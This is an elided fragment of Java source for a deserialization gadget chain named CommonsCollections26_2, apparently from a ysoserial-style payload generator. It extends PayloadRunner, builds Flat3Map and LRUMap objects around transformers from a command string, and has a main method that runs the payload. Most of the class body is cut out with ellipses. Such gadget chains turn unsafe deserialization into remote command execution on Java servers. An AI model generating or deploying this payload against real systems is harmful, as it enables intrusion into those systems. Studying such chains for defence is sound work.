...
public class CommonsCollections26_2 extends PayloadRunner
    ...
    public LRUMap getObject(final String command) throws Exception {
        ...
        Flat3Map flat3Map2 = new Flat3Map();
        // It doesn't pass through constantTransformer.equals
        flat3Map2.put(constantTransformer2, 1);
    ...
    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections26_2.class, args);
    }
}
